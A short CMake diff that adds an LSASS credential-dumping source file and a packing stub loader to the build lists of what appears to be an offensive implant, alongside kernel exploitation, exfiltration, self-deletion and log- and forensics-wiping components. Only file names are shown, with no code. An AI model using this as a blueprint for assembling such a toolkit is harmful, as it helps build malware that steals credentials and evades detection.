@@ -16,6 +16,7 @@ set(RUNTIME_SOURCES
     execution/driver_interact.c
     exploitation/kernel_exploit.c
     exfil/exfil.c
+    exfil/lsass_dump.c
     cleanup/self_delete.c
     cleanup/logs.c
     cleanup/forensics.c
@@ -35,7 +36,9 @@ if(NOT WIN32)
         execution/driver_interact.c
         exploitation/kernel_exploit.c
         exfil/exfil.c
+        exfil/lsass_dump.c
         cleanup/forensics.c
+        pack/stub_loader.c
     )
 endif()
 
